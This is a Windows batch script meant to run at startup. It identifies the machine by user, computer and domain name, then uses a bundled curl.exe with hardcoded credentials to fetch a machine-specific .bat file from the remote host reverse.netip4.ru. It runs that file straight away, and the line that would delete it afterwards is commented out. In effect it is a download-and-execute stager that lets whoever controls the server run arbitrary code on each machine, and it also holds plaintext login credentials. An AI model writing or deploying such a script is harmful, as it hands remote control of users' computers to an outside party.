@echo on
rem *******************************************************
rem RunDownloaded.002.TinySend.cmd
rem This Script Runs Downloaded Most Common Batch File
rem at Windows Startup
rem
rem PARAMETERS:	NONE
rem RETURNS: 	0 (usually)
rem		1 if chick integrity error
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem
rem Set a Prefix...
rem
set aPrefix2=TinySendRun
rem
set aPrefix1=DnRn
rem
rem
rem Set Suffix...
rem
set aSuffix1=%USERNAME%@%COMPUTERNAME%@%USERDOMAIN%
rem
rem Set a Suffix 2 with Datatime
rem
set CMDFILE01=%~dp0getBootDateTime.TinySend.cmd
if not exist %CMDFILE01% echo %CMDFILE01% not found && exit /b 1
FOR /F "delims=" %%i IN ('%CMDFILE01%') DO set aSuffix2=%%i
set CMDFILE01=
rem
rem Set a USERDNS0 Variable...
rem
set CMDFILE02=%~dp0get.DomainDNSSuffix.TinySend.cmd
if not exist %CMDFILE02% echo %CMDFILE02% not found && exit /b 1
FOR /F "delims=" %%i IN ('%CMDFILE02%') DO set USERDNS0=%%i
set CMDFILE02=
rem
rem Set a Suffix 3 with Computer DNS
rem
set aSuffix3=%COMPUTERNAME%@%USERDNS0%
rem

rem Set File Extension...
rem
set anExtension=bat
rem

rem
rem Set Full Temporary File Name...
rem
set TEMPCMDFILENAME=%aPrefix1%-%aPrefix2%-%aSuffix3%.%anExtension%
rem

rem Set a System Files...
rem
rem Set CURLEXE ....
set CURLEXE=%~dp0CURL.EXE
rem Check if files Exist
rem
if not exist %CURLEXE% echo %CURLEXE% is not found && exit /b 1
rem

rem Initialization Download Variables
rem
set http_pref001=http
set http_host001=file.netip4.ru
set http_port001=80
set http_dir0001=/WinUpdate/
set http_dir0000=/Exponenta/
set http_dir0003=/WinUpdate/WindowsMainUpdate/Other/
set http_echodir=/WinUpdate/InitialCommon/
set http_pref002=http
set http_host002=reverse.netip4.ru
set http_port002=80
set http_dir00000=/tmp/Files/
set http_dir00001=/tmp/Files/ComFiles/
set http_user001=MSSQLSR
set http_pass001=Admin01234

rem Derivatives Variables
set host=%http_pref002%://%http_host002%:%http_port002%%http_dir00001%%TEMPCMDFILENAME%
echo host = %host%
echo Local Folder = %TPDL%
rem
rem Set Local File...
set localfile=%TPDL%\%TEMPCMDFILENAME%
echo Local File = %localfile%

rem Send Local File...
rem
rem Download File from server
rem
"%CURLEXE%" -o %localfile% %host% -u %http_user001%:%http_pass001% --verbose

echo Run Downloaded File...
rem
call %localfile%
rem del %localfile%




